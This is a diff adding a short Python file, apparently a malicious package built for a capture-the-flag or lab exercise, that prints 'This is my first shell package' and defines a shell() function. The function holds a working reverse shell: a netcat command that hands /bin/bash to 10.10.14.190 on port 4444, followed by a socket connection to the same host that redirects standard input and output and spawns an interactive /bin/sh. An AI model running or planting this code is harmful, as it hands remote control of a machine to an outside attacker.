@@ -1,0 +1,16 @@
+#/usr/bin/env python3
+import requests
+import socket
+import subprocess
+import os
+
+print("This is my first shell package")
+
+def shell():
+	os.system('nc -e /bin/bash 10.10.14.190 4444')
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(("10.10.14.190",4444))
+	os.dup2(s.fileno(),0)
+	os.dup2(s.fileno(),1)
+	os.dup2(s.fileno(),2)
+	p=subprocess.call(["/bin/sh","-i"])
